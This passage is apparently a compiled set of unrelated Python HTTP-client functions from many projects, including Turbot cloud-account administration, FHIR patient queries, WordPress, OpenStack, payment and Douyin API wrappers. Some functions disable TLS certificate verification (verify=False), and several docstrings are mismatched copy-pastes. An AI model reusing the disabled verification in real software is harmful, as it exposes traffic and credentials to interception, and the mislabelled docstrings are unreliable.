        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    options_obj = json.loads(response.text)

    for child in options_obj['children']:
        print(child) 
**************************************
def create_user_ssh_keys(turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, turbot_host, turbot_user_id):
    """ Sets user access AKIA key pairs for a specified account

    NOTE: This requires a Cluster role Turbot/Owner or higher in order to work.
    """
    api_method = "POST"
    api_url = "/api/v1/users/%s/sshKeys" % (turbot_user_id)
    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    responseObj = json.loads(response.text)
    return(responseObj['privateKey']) 
**************************************
def get_guardrail_list(turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, turbot_host, turbot_account_urn, api_version):
    """ Gets the list of guardrails

    :returns: Returns a list of the guardrails"""

    api_method = "GET"
    api_url = "/api/%s/resources/%s/options" % (api_version, turbot_account_urn)
    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    responseObj = json.loads(response.text)

    return responseObj['items'] 
**************************************
def get_account_bill(turbot_host, turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, accountId, api_version):
    """ Gets the month to date charges for a given account

    """
    import requests
    import json
    import urllib.parse
    api_method = "GET"
    api_url = "/api/%s/accounts/%s/aws/estimatedCharges" % (api_version, accountId)

    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    # Convert the response JSON into a Python object
    responseObj = json.loads(response.text)

    print(responseObj['charges']['monthToDate']) 
**************************************
def delete_user_access_keys(turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, turbot_host, turbot_account, turbot_user_id, akey, api_version):
    """ Sets user access AKIA key pairs for a specified account

    NOTE: This requires a Cluster role Turbot/Owner or higher in order to work.
    """
    api_method = "DELETE"
    api_url = "/api/%s/accounts/%s/users/%s/awsAccessKeys/%s" % (api_version, turbot_account, turbot_user_id, akey)
    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    ) 
**************************************
def create_user_access_keys(turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, turbot_host, turbot_account, turbot_user_id, api_version):
    """ Sets user access AKIA key pairs for a specified account

    NOTE: This requires a Cluster role Turbot/Owner or higher in order to work.
    """
    api_method = "POST"
    api_url = "/api/%s/accounts/%s/users/%s/awsAccessKeys" % (api_version, turbot_account, turbot_user_id)
    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    responseObj = json.loads(response.text)
    akey = responseObj['accessKeyId']
    skey = responseObj['secretAccessKey']
    return (akey, skey) 
**************************************
def get_account_tags(turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, turbot_host, turbot_account, api_version):
    """ Sets user access AKIA key pairs for a specified account

    NOTE: This requires a Cluster role Turbot/Owner or higher in order to work.
    """
    api_method = "GET"
    api_url = "/api/%s/accounts/%s/" % (api_version, turbot_account)
    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    responseObj = json.loads(response.text)

    # If the account does not have tags, return false for an easy way to test later
    if 'tags' in responseObj:
        return responseObj['tags']
    else:
        return False 
**************************************
def add_user_to_account(turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, turbot_host,userarn, permissions, urn, api_version):
    ''' Adds a user to account with Grant'''
    import requests
    import json
    import urllib.parse
    # Set to the required API request type and location
    api_url = "/api/%s/resources/%s/grants/%s" % (api_version, urn, permissions)
    data = {"identityUrn":  userarn, "activate": True}

    response = requests.post(
        json=data,
        url=urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key)

    )

    # Convert the response JSON into a Python object and store it if we need it
    responseObj = json.loads(response.text) 
**************************************
def delete_user_grant(turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, turbot_host,userarn, permissions, urn, api_version):
    ''' Adds a user to account with Grant'''
    import requests
    import json
    import urllib.parse
    # Set to the required API request type and location
    api_method = "DELETE"
    api_url = "/api/%s/resources/%s/grants/%s/%s" % (api_version, urn, permissions,userarn)

    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    ) 
**************************************
def get_guardrails_for_account(turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, turbot_host, turbot_account, api_version):
    """ This returns the tick items notification stream from an account not the guardrail notifications"""
    api_method = "GET"
    api_url = "/api/%s/resources/%s/guardrails" % (api_version, turbot_account)
    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        },

    )

    responseObj = json.loads(response.text)

    return (responseObj['items']) 
**************************************
def get_guardrail_violation(turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, turbot_host, turbot_account, alarm_urn, api_version):
    """ This returns the tick items notification stream from an account not the guardrail notifications"""
    api_method = "GET"
    api_url = "/api/%s/resources/%s/guardrails/%s/notifications" % (api_version, turbot_account, alarm_urn)
    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        },

    )

    responseObj = json.loads(response.text)

    return (responseObj) 
**************************************
def call_dbot_api(self, dbot_address: str, uri: str, method: str, **requests_kwargs) -> Response:
        """Send the API's HTTP request

        Channel will be auto created if no channel or be topuped if
        insufficient balance in channel.
        The deposit value is determined by `deposit_strategy`.
        A signature of balance will be sent to DBot server to pay the price of the API.

        :param dbot_address: address of the DBot contract
        :param uri: uri of the endpoint
        :param method: method of the endpoint
        :param requests_kwargs: the other args for http request is same with `requests`
        :return: :class:`Response <Response>` object, http response of the API
        :rtype: requests.Response
        """
        dbot_address = Web3.toChecksumAddress(dbot_address)
        price = self.get_price(dbot_address, uri, method)
        channel = self._get_suitable_channel(dbot_address, price)
        channel.create_transfer(price)
        domain = self.get_dbot_domain(dbot_address)
        dbot_url = domain if domain.lower().startswith('http') else 'http://{}'.format(domain)
        url = '{}/call/{}/{}'.format(dbot_url, dbot_address, remove_slash_prefix(uri))
        return self._request(channel, method, url, **requests_kwargs) 
**************************************
def getPatients(self):
	######################################
	# Purpose: dump all patients on this
	# 	EMR. 
	#	
	##########################################
		mod = 'download_data.py:FHIR:getPatients'
		addon = 'Patient/'
		url1 = self.url + addon

		#	cmd = 'curl --request GET  --url url --header Accept: "application/json" --header apikey: api_key ' 
		#print url1

		import requests
		response = requests.request("GET", url1, headers=self.headers)
		return  response.text 
**************************************
def getConditions(self, site, cond) :
	######################################
	# Purpose: dump Condition resources 
	# 	that match site and condition
	#	
	# https://smilecdr.com/docs/current/tutorial_and_tour/fhir_search_queries.html
	##########################################
		mod = 'download_data.py:FHIR:getCondition'
		#addon = 'Condition?_bodySite=' + site + '&_content=' + cond		# gives odd results
		addon = 'Condition?_content=' + site + '&_content=' + cond
		url1 = self.url + addon

		#print (mod, url1)
		import requests, json
		response = requests.request("GET", url1, headers=self.headers)
		return  json.loads(response.text) 
**************************************
def getPatients(self):
	######################################
	# Purpose: get list of all patients in
	# 		VNA
	#	
	##########################################
		mod = 'download_data.py:DCMweb:getStudies'
		# according to this link the below should get a result
		# https://docs.google.com/spreadsheets/d/e/2PACX-1vSBEymDKGZgskFEFF6yzge5JovGHPK_FIbEnW5a6SWUbPkX06tkoObUHh6T1XQhgj-HqFd0AWSnVFOv/pubhtml?gid=1094535210&single=true

		addon = 'patients/'

		url1 = self.url + addon

		import requests
		response = requests.request("GET", url1, headers=self.headers)
		return  response.text 
**************************************
def _request(self, method_name, **kw):
        method, endpoint, params, data, json, headers = self._prepare_req(
            method_name, **kw
        )

        http_response = requests.request(
            method,
            self.site + endpoint,
            auth=self.auth,
            params=params,
            data=data,
            json=json,
            headers=headers
        )

        if http_response.status_code not in [200, 201]:
            if 'application/json' in http_response.headers.get('Content-Type'):
                code = http_response.json().get('code')
                message = http_response.json().get('message')
            else:
                code = http_response.status_code
                message = http_response.text
            raise WordpressError(" ".join([
                str(http_response.status_code),
                str(http_response.reason),
                ":",
                '[{code}] {message}'.format(code=code, message=message)
            ]))
        elif 'application/json' in http_response.headers.get('Content-Type'):
            return http_response.json()
        else:
            raise WordpressError(" ".join([
                "Expected JSON response but got",
                http_response.headers.get('Content-Type')])) 
**************************************
def _get(self, path, params=None):
        return self.request("GET", path, params) 
**************************************
def _post(self, path, params=None):
        return self.request("POST", path, params) 
**************************************
def _delete(self, path, params=None):
        return self.request("DELETE", path, params) 
**************************************
def request(method, url, data=None, json=None, headers=None, params=None):
    # pylint: disable=too-many-arguments
    """Universal interface for request."""

    # Make it possible to call only with short name (without _BASE_URL).
    if not url.startswith('https://'):
        url = _BASE_URL + url

    # Setup the headers with default Content-Type and Subscription Key.
    headers = headers or {}
    if 'Content-Type' not in headers:
        headers['Content-Type'] = 'application/json'
    headers['Ocp-Apim-Subscription-Key'] = Key.get()

    response = requests.request(method, url, params=params, data=data,
                                json=json, headers=headers)

    # Handle result and raise custom exception when something wrong.
    result = None
    # `person_group.train` return 202 status code for success.
    if response.status_code not in (200, 202):
        print('status_code: {}'.format(response.status_code))
        print('response: {}'.format(response.text))
        error_msg = response.json()['error']
        raise CognitiveFaceException(
            response.status_code,
            error_msg.get('code'),
            error_msg.get('message'))

    # Prevent `reponse.json()` complains about empty response.
    if response.text:
        result = response.json()
    else:
        result = {}

    return result 
**************************************
def get_token(self, forceNew=False):
        """
        Get the existing token or creates it if it doesn't exist.
        Returns the API token.

        If `forceNew` is true  the function will do a new login to retrieve the token.
        """
        from . import KEYS
        if not KEYS.API_TOKEN or forceNew:
            if not KEYS.API_KEY:
                raise APIKeyError

            if hasattr(self,"USER") and hasattr(self,"USER_KEY"):
                data = {"apikey": KEYS.API_KEY, "username": self.USER, "userkey": self.USER_KEY}
            else:
                data={"apikey": KEYS.API_KEY}

            response = requests.request(
                    'POST', self._get_complete_url('login'), 
                    data=json.dumps(data), 
                    headers=self._headers)
            if response.status_code == 200:
                KEYS.API_TOKEN = response.json()['token']
            else:
                error = "Unknown error while authenticating. Check your api key or your user/userkey"
                try:
                    error = response.json()['Error']
                except:
                    pass
                raise AuthenticationError(error)
        return KEYS.API_TOKEN 
**************************************
def send(self, request):
        if self.__config is None:
            raise ClientException('Miss config object')
        if self.__credential is None:
            raise ClientException('Miss credential object')
        if request is None:
            raise ClientException('Miss request object')
        if request.parameters is None:
            raise ClientException('Miss parameters in request')

        region = self.__get_region_id(request)

        try:
            header = self.__merge_headers(request.header)
            token = header.get(const.JDCLOUD_SECURITY_TOKEN, '')

            param_builder = self.__builder_map[request.method]()
            url = param_builder.build_url(request, self.__config.scheme, self.__config.endpoint)
            body = param_builder.build_body(request)
            self.__logger.log(INFO, 'url=' + url)
            self.__logger.log(INFO, 'body=' + body)

            signer = Signer(self.__logger)
            signer.sign(method=request.method, region=region, uri=url,
                        headers=header, data=body, credential=self.__credential,
                        security_token=token, service=self.__service_name)
            self.__logger.log(INFO, header)

            resp = requests.request(request.method, url, data=body, headers=header,
                                    timeout=self.__config.timeout)
            self.__logger.log(INFO, resp.content)

            return self.__process_response(request.method, resp)
        except Exception as expt:
            msg = traceback.format_exc()
            self.__logger.log(ERROR, msg)
            raise expt 
**************************************
def __get_region_id(self, request):
        if isinstance(request.parameters, dict):
            if 'regionId' in request.parameters and request.parameters['regionId'] is not None:
                return request.parameters['regionId']
        else:
            if hasattr(request.parameters, 'regionId') and request.parameters.regionId is not None:
                return request.parameters.regionId

        return 'jdcloud-api'  # when no region, use this value to fill field for sign 
**************************************
def request(self, url, method='GET', body=None, headers=None):
        _headers = {'Content-Type': 'application/json'}
        _headers.update(headers or {})

        response = requests.request(method, url, data=body, headers=_headers)
        return response 
**************************************
def api_request(self, relative_uri, check_response_status=None,
                    strip_version=False, **kwargs):
        auth_result = self._authenticate()

        # NOTE(justinsb): httplib 'helpfully' converts headers to lower case
        base_uri = auth_result['x-server-management-url']
        if strip_version:
            # NOTE(vish): cut out version number and tenant_id
            base_uri = '/'.join(base_uri.split('/', 3)[:-1])

        full_uri = '%s/%s' % (base_uri, relative_uri)

        headers = kwargs.setdefault('headers', {})
        headers['X-Auth-Token'] = auth_result['x-auth-token']
        if self.microversion:
            headers['X-OpenStack-Nova-API-Version'] = self.microversion

        response = self.request(full_uri, **kwargs)

        http_status = response.status_code
        LOG.debug("%(relative_uri)s => code %(http_status)s",
                  {'relative_uri': relative_uri, 'http_status': http_status})

        if check_response_status:
            if http_status not in check_response_status:
                if http_status == 404:
                    raise OpenStackApiNotFoundException(response=response)
                elif http_status == 401:
                    raise OpenStackApiAuthorizationException(response=response)
                else:
                    raise OpenStackApiException(
                        message="Unexpected status code",
                        response=response)

        return response 
**************************************
def httpdo(url, method="GET", data=None):
    """
    thread safe http request
    """
    p = urlparse(url)
    with namedlock(p.scheme+"://"+p.netloc):
        return _unsafe_httpdo(url, method, data) 
**************************************
def _unsafe_httpdo(url, method='GET', data=None):
    """
    Do HTTP Request
    """
    start = time.time()
    if DEBUG:
        body = json.dumps(data) if data else ''
        print("Shell: curl -X {method} -d '{body}' '{url}'".format(
            method=method.upper(), body=body or '', url=url))

    try:
        response = requests.request(method,
                                    url,
                                    json=data,
                                    timeout=HTTP_TIMEOUT)
    except (requests.exceptions.ConnectionError,
            requests.exceptions.ReadTimeout) as e:
        raise

    if DEBUG:
        ms = (time.time() - start) * 1000
        print('Return ({:.0f}ms): {}'.format(ms, response.text))

    try:
        retjson = response.json()
        retjson['status'] = retjson.get('status', 0)
        r = convert(retjson)
        if r.status != 0:
            raise WDARequestError(r.status, r.value)
        return r
    except JSONDecodeError:
        if response.text == "":
            raise WDAEmptyResponseError(method, url, data)
        raise WDAError(method, url, response.text) 
**************************************
def api_service(route, token="", method="get", data=None, content_type="application/json",proxy=None):
    resp = requests.request(method=method, url="{0}/{1}/{2}".format(API_EP_DOUYIN, route, token), data=data,
                            headers={"Content-Type": content_type}, verify=False,proxies=proxy)
    if token != "" and resp.headers.get("x-token") != token:
        raise Exception(resp.headers.get("x-token"))
    elif resp.headers.get("x-token-times") == "0":
        raise Exception(resp.content)
    data = resp.content.decode("utf-8")
    return json.loads(data) 
**************************************
def get_grants(turbot_host, turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, namespace, api_version):
    account_list = []
    api_method = "GET"
    api_url = "/api/%s/resources/%s/grants" % (api_version, namespace)

    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    # Convert the response JSON into a Python object
    responseObj = json.loads(response.text)

    for obj in responseObj['items']:
        if 'user' in obj:
            common_name = obj['user']['displayName']
        else:
            # Not all accounts have user displayname, most commonly [email protected]'s
            dummy, common_name = obj['identityUrn'].split('::user:')

        if '_DELETED' in common_name:
            print('Former employee %s found in account %s' % (common_name, namespace))
        account_list.append(common_name)
    return account_list 
**************************************
def delete_fingerprint(turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, turbot_host, turbot_user_id, finger):
    api_method = "DELETE"
    api_url = "/api/v1/users/%s/sshKeys/%s" % (turbot_user_id, finger)
    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    ) 
**************************************
def get_notifications(turbot_host, turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, namespace, api_version):
    """ Gets the turbot notification for account
    
    :param turbot_host: turbot host
    :param turbot_api_access_key: turbot access key
    :param turbot_api_secret_key: turbot secret key
    :param turbot_host_certificate_verification: should be true
    :param namespace: the turbot namespace to look for alarms
    :param api_version: api version
    :return: Returns notification_list of all active notifications
    """
    api_method = "GET"
    api_url = "/api/%s/resources/%s/controls?filter=state:alarm,error" % (api_version, namespace)
    notification_list = []
    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    responseObj = json.loads(response.text)
    for notification in responseObj['items']:
        notification_list.append(notification['alarmUrn'])
    return notification_list 
**************************************
def get_guardrail(turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, turbot_host, turbot_account_urn, guardrail, api_version):
    """ Gets a guardrail

    :returns: returns a guardrail setting """

    api_method = "GET"
    api_url = "/api/%s/resources/%s/options/%s" % (api_version, turbot_account_urn, guardrail)

    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    responseObj = json.loads(response.text)
    print(responseObj['value'])
    return responseObj['value'] 
**************************************
def get_cluster_id(turbot_host, turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, api_version):
    """ Gets the cluster id
    # TODO: put this in cluster.py
    """
    import requests
    import json
    import urllib.parse
    api_method = "GET"
    api_url = "/api/%s/cluster" % (api_version)

    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    # Convert the response JSON into a Python object
    responseObj = json.loads(response.text)
    urn = responseObj['urn']

    return urn 
**************************************
def get_turbot_account_ids(turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, turbot_host, api_version):
    """ Gets the current turbot account names

    :return: Returns a dict of turbot account names as turbot_id:AWSaccount
    """
    import requests
    import json
    import urllib.parse
    # Set to the required API request type and location
    accounts = {}
    api_method = "GET"
    api_url = "/api/%s/accounts" % (api_version)

    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    # Convert the response JSON into a Python object
    responseObj = json.loads(response.text)

    if responseObj['items']:
        # A user may not have permission to list all accounts
        for obj in responseObj['items']:
            accounts[obj['id']] = obj['awsAccountId']

    return accounts 
**************************************
def get_aws_account_ids(turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, turbot_host, api_version):
    import requests
    import json
    import urllib.parse
    """ Gets the current turbot account names

    :return: Returns a list of turbot account names as accounts
    """
    # Set to the required API request type and location
    accounts = []
    api_method = "GET"
    api_url = "/api/%s/accounts" % (api_version)

    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    # Convert the response JSON into a Python object
    responseObj = json.loads(response.text)

    for obj in responseObj['items']:
        accounts.append(obj['awsAccountId'].zfill(12))

    return accounts 
**************************************
def get_account_titles(turbot_api_access_key, turbot_api_secret_key,turbot_host_certificate_verification, turbot_host, api_version):
    import requests
    import json
    import urllib.parse
    accounts = {}
    api_method = "GET"
    api_url = "/api/%s/accounts" % (api_version)

    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    # Convert the response JSON into a Python object
    responseObj = json.loads(response.text)

    for obj in responseObj['items']:
        accounts[obj['id']] = obj['title']

    return accounts 
**************************************
def get_turbot_vpc_subnets(turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, turbot_host, turbot_account, api_version):
    """ Gets the current turbot vpc configuration for an account

    :return: Returns the current turbot VPC configuration
    """
    api_method = "GET"
    api_url = "/api/%s/accounts/%s/vpcs" % (api_version, turbot_account)
    vpc_list = []

    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    # Convert the response JSON into a Python object
    responseObj = json.loads(response.text)
    for obj in responseObj['items']:
        vpc_list.append(obj['subnets'])

    return vpc_list 
**************************************
def list_user_access_keys(turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, turbot_host, turbot_account, turbot_user_id, api_version):
    """ Sets user access AKIA key pairs for a specified account

    NOTE: This requires a Cluster role Turbot/Owner or higher in order to work.
    """
    api_method = "GET"
    api_url = "/api/%s/accounts/%s/users/%s/awsAccessKeys" % (api_version, turbot_account, turbot_user_id)
    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    responseObj = json.loads(response.text)

    if'accessKeyId' in responseObj['items'][0]:

        exists = True
        akey = responseObj['items'][0]['accessKeyId']
    else:
        exists = False
        akey = False
    return (exists, akey) 
**************************************
def get_notifications_for_account(turbot_host, turbot_api_access_key, turbot_api_secret_key, turbot_host_certificate_verification, namespace, api_version):
    """ Gets the turbot notification for account

    :param turbot_host: turbot host
    :param turbot_api_access_key: turbot access key
    :param turbot_api_secret_key: turbot secret key
    :param turbot_host_certificate_verification: should be true
    :param namespace: the turbot namespace to look for alarms
    :param api_version: api version
    :return: Returns notification_list of all active notifications
    """
    api_method = "GET"
    api_url = "/api/%s/resources/%s/controls" % (api_version, namespace)
    notification_list = []
    response = requests.request(
        api_method,
        urllib.parse.urljoin(turbot_host, api_url),
        auth=(turbot_api_access_key, turbot_api_secret_key),
        verify=turbot_host_certificate_verification,
        headers={
            'content-type': "application/json",
            'cache-control': "no-cache"
        }
    )

    responseObj = json.loads(response.text)

    for notification in responseObj['items']:
        notification_list.append(notification['alarmUrn'])
    return notification_list 
**************************************
def _do_request(self, method, url, headers=None, params=None):
        import requests
        requests.packages.urllib3.disable_warnings()
        try:
            data = json.dumps(params) if params is not None else None
            if self.debug:
                print_headers = "# Headers:"
                for line in json.dumps(headers, indent=4).split('\n'):
                    print_headers += '\n#    %s' % line
                print '#####################################################'
                print '# Request'
                print '# Method: %s' % method
                print '# URL: %s' % url
                print print_headers
                print "# Parameters: %s" % data
                print '#####################################################'
            response = requests.request(method, url, headers=headers,
                                        verify=False, timeout=10, data=data)
        except requests.exceptions.RequestException as error:
            print 'Error: Unable to connect.'
            print 'Detail: %s' % error
            raise SystemExit(1)
        if self.debug:
            print_headers = "# Headers:"
            for line in json.dumps(dict(response.headers),
                                   indent=4).split('\n'):
                print_headers += '\n#    %s' % line
            print '# Response'
            print '# Status code: %s' % response
            print print_headers
            print '# Body: %s' % response.text
            print '#####################################################'
            print ''
        return response 
**************************************
def __str__(self):
        """Return a string representing the form data, including attached files."""
        # Build a list of lists, each containing "lines" of the
        # request.  Each part is separated by a boundary string.
        # Once the list is built, return a string where each
        # line is separated by '\r\n'.
        parts = []
        part_boundary = '--' + self.boundary

        # Add the form fields
        parts.extend(
            [part_boundary,
             'Content-Disposition: form-data; name="%s"' % name,
             'Content-Type: text/plain; charset=UTF-8',
             '',
             value,
             ]
            for name, value in self.form_fields
        )

        # Add the files to upload
        parts.extend(
            [part_boundary,
             'Content-Disposition: file; name="%s"; filename="%s"' % \
             (field_name, filename),
             'Content-Type: %s' % content_type,
             'Content-Transfer-Encoding: binary',
             '',
             body,
             ]
            for field_name, filename, content_type, body in self.files
        )

        # Flatten the list and add closing boundary marker,
        # then return CR+LF separated data
        flattened = list(itertools.chain(*parts))
        flattened.append('--' + self.boundary + '--')
        flattened.append('')
        return '\r\n'.join(flattened) 
**************************************
def getResponse(self, accessToken=None, version='2.0', timeout=30):
        # =======================================================================
        # 获取response结果
        # =======================================================================
        sys_parameters = {
            P_FORMAT: 'json',
            P_APPKEY: self.__app_key,
            P_SIGN_METHOD: "md5",
            P_VERSION: '1.0',
            P_TIMESTAMP: str(self.getTime()),
            #P_PARTNER_ID: SYSTEM_GENERATE_VERSION,
            P_API: self.getapiname(),
        }
        if accessToken is not None:
            sys_parameters[P_ACCESS_TOKEN] = accessToken
        application_parameter = self.getApplicationParameters()

        sys_parameters[P_JSON_PARAM_KEY] = json.dumps(application_parameter, ensure_ascii=False,
                                                      default=lambda value: value.__dict__)
        sys_parameters[P_SIGN] = sign(self.__secret, sys_parameters)
        from urllib.parse import urlencode

        #print(self.__domain+"?"+urlencode(sys_parameters))
        #result = requests.get(self.__domain+"?"+urlencode(sys_parameters))

        header = self.get_request_header()
        result = requests.request(self.__httpmethod,self.__domain,data=sys_parameters,headers=header,timeout=timeout)

        jsonobj = {}
        try:
            jsonobj = result.json()
        except Exception as e:
            jsonobj =e
        return jsonobj 
**************************************
def __str__(self):
        """Return a string representing the form data, including attached files."""
        # Build a list of lists, each containing "lines" of the
        # request.  Each part is separated by a boundary string.
        # Once the list is built, return a string where each
        # line is separated by '\r\n'.  
        parts = []
        part_boundary = '--' + self.boundary
        
        # Add the form fields
        parts.extend(
            [ part_boundary,
              'Content-Disposition: form-data; name="%s"' % name,
              'Content-Type: text/plain; charset=UTF-8',
              '',
              value,
            ]
            for name, value in self.form_fields
            )
        
        # Add the files to upload
        parts.extend(
            [ part_boundary,
              'Content-Disposition: file; name="%s"; filename="%s"' % \
                 (field_name, filename),
              'Content-Type: %s' % content_type,
              'Content-Transfer-Encoding: binary',
              '',
              body,
            ]
            for field_name, filename, content_type, body in self.files
            )
        
        # Flatten the list and add closing boundary marker,
        # then return CR+LF separated data
        flattened = list(itertools.chain(*parts))
        flattened.append('--' + self.boundary + '--')
        flattened.append('')
        return '\r\n'.join(flattened) 
**************************************
def request_transaction(self, transaction: Transaction) -> Transaction:
        data = {
            'payer_number': transaction.meta.get('payer_number'),
            'payer_name': transaction.meta.get('payer_name'),
            'amount': transaction.amount,
            'note': transaction.meta.get('note'),
            'silent': transaction.meta.get('silent')
        }
        for key in ('payer_name', 'payer_number', 'note'):
            if data[key] is None:
                raise ValueError('Transaction meta required (%s)' % key)
        url = '%s/bills' % self._server_url
        headers = {
            'access-token': self.config['access_token'],
            'content-type': 'application/json'
        }
        try:
            response = request(
                'post', url, json=[data], headers=headers
            )
        except RequestException:
            raise GatewayNetworkError('Cannot connect to bahamta server.')

        if response.status_code != 200:
            raise TransactionError(
                'Invalid transaction information (%s)' % response.status_code
            )
        response_data = response.json()[0]
        transaction.id = response_data['bill_id']
        transaction.meta = response_data
        return transaction 
**************************************
def validate_transaction(self, data: dict) -> Transaction:
        transaction = Transaction()
        transaction.id = data['bill_id']
        transaction.meta = data
        if data['state'] in ('pay', 'request'):
            transaction.validate_status = True
        return transaction 
**************************************
def verify_transaction(self, transaction: Transaction, data):
        url = '%s/bills/%s' % (self._server_url, transaction.id)
        headers = {
            'access-token': self.config['access_token'],
            'content-type': 'application/json'
        }
        try:
            response = request('get', url, headers=headers)
        except RequestException:
            raise GatewayNetworkError('Cannot connect to bahamta server.')

        if response.status_code != 200:
            raise TransactionError(
                'Invalid transaction information (%s)' % response.status_code
            )
        response_data = response.json()

        if response_data['state'] != 'pay':
            raise TransactionError('Transaction not paid')

        if int(transaction.amount) != int(response_data['amount']):
            raise TransactionError('Amount mismatch')

        transaction.pan = response_data['pay_pan']
        transaction.meta = response_data
        return transaction 
**************************************
def on_cooperative_close_denied(self, dbot_address: str, response: Response = None) -> None:
        """Call back function when no valid closing signature received

        This function will be called when can not get valid closing signature in
        method `close_channel`

        :param dbot_address: address of the DBot contract
        :param response: response from DBot server when request closing signature
        """
        logger.warning('No valid closing signature received from DBot server({}).\n{}'.format(dbot_address, response.text))
        logger.warning('Closing noncooperatively on a balance of 0.')
        # if cooperative close denied, client close the channel with balance 0 unilaterally
        self.uncooperative_close_channel(dbot_address, 0) 
**************************************
def _request(
            self,
            channel: Channel,
            method: str,
            url: str,
            **requests_kwargs
    ) -> Tuple[Union[None, Response], bool]:
        """
        Performs a simple request to the HTTP server with headers representing the given
        channel state.
        """
        headers = Munch()
